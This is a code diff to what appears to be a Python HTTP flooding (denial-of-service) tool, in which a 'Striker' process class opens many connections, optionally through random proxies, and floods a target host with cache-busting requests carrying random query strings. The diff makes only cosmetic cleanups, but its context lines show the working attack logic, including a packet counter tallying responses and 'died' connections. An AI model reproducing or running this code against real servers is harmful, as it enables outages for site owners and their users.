@@ -30,7 +30,7 @@ class Striker(__import__('multiprocessing').Process):
     def run(self):
         while self.runnable:
             try:
-                for i in range(self.sockets): self.socks.append(HTTPConnection(choice(proxies).replace("\n", "")) if self.use_proxies else (HTTPSConnection(self.host) if self.ssl else HTTPConnection(self.host)))
+                for _ in range(self.sockets): self.socks.append(HTTPConnection(choice(proxies).replace("\n", "")) if self.use_proxies else (HTTPSConnection(self.host) if self.ssl else HTTPConnection(self.host)))
                 for conn_req in self.socks:
                     url, r_headers = self.generateData()
                     random_keys, headers = list(r_headers.keys()), {}
@@ -45,7 +45,7 @@ class Striker(__import__('multiprocessing').Process):
             if self.printer: print(f"{self.packets[0] * self.threads} packets got a response and {self.packets[1] * self.threads} died", end = "\r")
     def generateQueryString(self, ammount = 1): return '&'.join(["{0}={1}".format("".join([chr(choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for i in range(0, randint(3,10))]), "".join([chr(choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for i in range(0, randint(3,20))])) for i in range(ammount)])
     def generateData(self):
-        returnCode, param_joiner = 0, "?"
+        param_joiner = "?"
         if not self.url: self.url = '/'
         if self.url.count("?"): param_joiner = "&"
         noCacheDirectives = ['no-cache', 'max-age=0']
